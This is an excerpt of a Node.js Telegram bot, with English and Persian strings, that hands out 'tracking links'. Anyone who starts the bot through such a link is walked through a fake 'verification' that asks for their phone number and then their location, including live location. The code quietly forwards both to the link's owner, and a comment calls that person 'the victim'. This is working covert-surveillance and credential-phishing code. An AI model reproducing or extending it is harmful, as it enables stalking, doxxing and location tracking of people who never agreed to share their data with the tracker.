...
const BotUserSchema = new mongoose.Schema({
  ...
  verificationStep: { type: String, default: 'none' }, // Track the current verification step: 'phone', 'location', or 'none'
});
...
const messages = {
  en: {
    ...
    trackLinkMessage: (url) => `Here is your unique tracking link to get locations:\n${url}\nShare this link with others, and when they start the bot with this link and share their phone number and location, their details will be sent to you!`,
  ...
  fa: {
    ...
    trackLinkMessage: (url) => `این لینک ردیابی منحصر به فرد شما برای دریافت شماره تلفن و موقعیت است:\n${url}\nاین لینک را با دیگران به اشتراک بگذارید، و هنگامی که آنها ربات را با این لینک شروع کرده و شماره تلفن و موقعیت خود را به اشتراک بگذارند، اطلاعات آنها برای شما ارسال خواهد شد!`,
...
const languageKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      ...
      [
        { text: messages[lang].trackLocation, callback_data: 'track_location' },
      ],
    ],
  },
});
...
module.exports = async (req, res) => {
  try {
    ...
    if (!user) {
      ...
      // Check if the user started with a referral
      if (update.message?.text?.startsWith('/start')) {
        const startParam = update.message.text.split(' ')[1] || '';
        console.log(`Start parameter: ${startParam}`);
        if (startParam && !startParam.startsWith('track_') && /^\d+$/.test(startParam)) {
    ...
    if (update.message) {
      ...
      if (text?.startsWith('/start')) {
        ...
        // Check if the start command includes a tracking link
        ...
        // Update the user's verification state based on the start command
        user.requiresVerification = isTrackingLink;
        user.currentTrackerId = trackerId;
        user.verificationStep = isTrackingLink ? 'phone' : 'none'; // Start with phone number verification
        await user.save();

        if (user.requiresVerification) {
          // Show the share phone number button for tracking link
          console.log(`Showing share phone number button to user ${userId} with trackerId ${trackerId}`);
          ...
          if (user.isFirstStart) {
            ...
            console.log(`User ${userId} has joined, showing main menu`);
            await bot.telegram.sendMessage(
              chatId,
        ...
        if (user.requiresVerification && user.currentTrackerId && user.verificationStep === 'phone') {
          try {
            const phoneNumber = update.message.contact.phone_number;
            const username = user.username || 'Unknown';
            const trackerId = user.currentTrackerId;

            console.log(`Processing phone number for user ${userId}, phone: ${phoneNumber}, trackerId: ${trackerId}`);

            // Send phone number to the tracker
            const notification = messages['en'].phoneNumberNotification(username, userId, phoneNumber);
            console.log(`Sending phone number notification to tracker ${trackerId}: ${notification}`);
            await bot.telegram.sendMessage(trackerId, notification);

            console.log(`Phone number notification sent to tracker ${trackerId}`);

            // Move to the next verification step: location
            user.verificationStep = 'location';
            await user.save();

            // Prompt the victim to share their location
            await bot.telegram.sendMessage(
              chatId,
              messages[lang].shareLocationMessage,
              shareLocationKeyboard(lang)
            );
            console.log(`Prompted user ${userId} to share location`);
          } catch (error) {
          ...
          console.log(`User ${userId} shared contact but no verification is required or step mismatch`);
          await bot.telegram.sendMessage(chatId, messages[lang].noVerificationNeeded);
        }
      }

      else if (update.message.location) {
        console.log(`User ${userId} shared location: ${JSON.stringify(update.message.location)}`);
        // Handle location sharing
        if (user.requiresVerification && user.currentTrackerId && user.verificationStep === 'location') {
          try {
            const { latitude, longitude, live_period } = update.message.location;
            const username = user.username || 'Unknown';
            const trackerId = user.currentTrackerId;

            console.log(`Storing location for user ${userId}, latitude: ${latitude}, longitude: ${longitude}, live_period: ${live_period || 'not live'}, trackerId: ${trackerId}`);
            ...
            console.log(`Location stored in database: ${JSON.stringify(trackedLocation)}`);
            ...
            console.log(`Sending text notification to tracker ${trackerId}: ${notification}`);
            await bot.telegram.sendMessage(trackerId, notification);

            // Send the location in Telegram's native format
            console.log(`Sending Telegram location to tracker ${trackerId}`);
            await bot.telegram.sendLocation(trackerId, latitude, longitude, {
              live_period: live_period || undefined, // Include live_period if present
            });

            console.log(`Notifications sent to tracker ${trackerId}`);
            ...
            // Reset the verification state after successful verification
          ...
          console.log(`User ${userId} shared location but no verification is required or step mismatch`);
          await bot.telegram.sendMessage(chatId, messages[lang].noVerificationNeeded);
        }
      }
    ...
    if (update.callback_query) {
      ...
      else if (callbackData === 'track_location') {
        try {
